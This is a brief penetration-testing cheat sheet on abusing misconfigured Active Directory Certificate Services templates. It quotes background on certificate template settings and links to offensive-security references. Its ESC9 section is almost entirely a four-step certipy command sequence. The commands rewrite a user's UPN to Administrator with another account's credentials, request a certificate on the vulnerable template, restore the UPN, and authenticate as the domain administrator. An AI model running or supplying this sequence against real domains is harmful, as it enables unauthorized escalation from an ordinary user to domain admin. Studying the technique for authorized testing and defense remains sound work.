---
title: Misconfigured Certificate Templates
---

- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
- https://www.thehacker.recipes/ad/movement/adcs/#attack-paths

### Template theory[​](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#template-theory)

> AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. These templates are collections of enrollment policies and predefined certificate settings and contain things like “_How long is this certificate valid for?_”, _“What is the certificate used for?”,_ “_How is the subject specified?_”, _“Who is allowed to request a certificate?”_, and a myriad of other settings
> 
> [...]
> 
> There is a specific set of settings for certificate templates that makes them extremely vulnerable. As in regular-domain-user-to-domain-admin vulnerable.
> 
> ([specterops.io](https://posts.specterops.io/certified-pre-owned-d95910965cd2))


## ESC9

- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#id-5485

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```